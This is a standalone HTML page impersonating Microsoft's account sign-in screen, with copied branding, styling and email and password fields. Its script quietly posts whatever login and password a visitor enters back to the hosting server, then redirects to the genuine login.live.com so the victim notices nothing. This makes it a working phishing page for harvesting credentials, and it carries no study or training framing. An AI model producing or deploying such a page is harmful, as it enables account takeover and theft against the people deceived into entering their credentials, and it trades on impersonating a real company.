<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in to your Microsoft account</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:white}.container{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f2f2f2}.box{background:white;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.1)}.logo{margin-bottom:16px}.logo img{height:24px}.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}input{width:100%;padding:6px 10px;border:1px solid #605e5c;border-radius:2px;font-size:15px;height:36px;margin-bottom:16px;outline:none}input:focus{border-color:#0067b8}input[type="submit"]{background:#0067b8;color:white;border:none;cursor:pointer;height:40px;font-size:15px}input[type="submit"]:hover{background:#005da6}.link{font-size:13px;color:#0067b8;text-decoration:none}.link:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 108 23'><path fill='%23f25022' d='M0 0h10.5v10.5H0z'/><path fill='%237fba00' d='M12 0h10.5v10.5H12z'/><path fill='%2300a4ef' d='M0 12h10.5v10.5H0z'/><path fill='%23ffb900' d='M12 12h10.5v10.5H12z'/></svg>"alt="Microsoft"></div><div class="title">Sign in</div><form method="POST"><input type="text"name="login"placeholder="Email, phone, or Skype"required><input type="password"name="passwd"placeholder="Password"required><input type="submit"value="Sign in"></form><a href="#"class="link">Can't access your account?</a></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://login.live.com';});});</script></body></html>
